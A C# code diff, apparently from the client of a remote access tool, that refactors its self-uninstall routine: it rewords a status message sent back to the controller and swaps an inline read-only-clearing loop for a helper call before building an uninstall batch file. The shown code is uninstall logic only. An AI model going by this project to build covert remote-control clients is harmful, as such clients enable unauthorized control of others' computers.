@@ -14,7 +14,7 @@ namespace xClient.Core.Installation
         {
             if (!Settings.INSTALL)
             {
-                new Packets.ClientPackets.SetStatus("Can not uninstall client. Installation was not enabled.").Execute(client);
+                new Packets.ClientPackets.SetStatus("Uninstallation failed: Installation is not enabled").Execute(client);
                 return;
             }
 
@@ -25,33 +25,8 @@ namespace xClient.Core.Installation
 
             try
             {
-                DirectoryInfo dir = new DirectoryInfo(ClientData.InstallPath);
-
-                if (dir.Exists)
-                {
-                    // Directory is marked as read-only, so we must remove it.
-                    if ((dir.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
-                    {
-                        if (WindowsAccountHelper.GetAccountType() == "Admin")
-                        {
-                            foreach (FileInfo file in dir.GetFiles())
-                            {
-                                try
-                                {
-                                    // Try to set the files in the folder to normal so they can be deleted.
-                                    file.Attributes = FileAttributes.Normal;
-                                }
-                                catch
-                                { }
-                            }
-                        }
-                        else
-                        {
-                            // We need admin privileges to strip this directory of the read-only attribute...
-                            return;
-                        }
-                    }
-                }
+                if (!FileHelper.ClearReadOnly(ClientData.CurrentPath))
+                    new Packets.ClientPackets.SetStatus("Uninstallation failed: File is read-only").Execute(client);
 
                 string batchFile = FileHelper.CreateUninstallBatch(Settings.HIDEFILE);
 
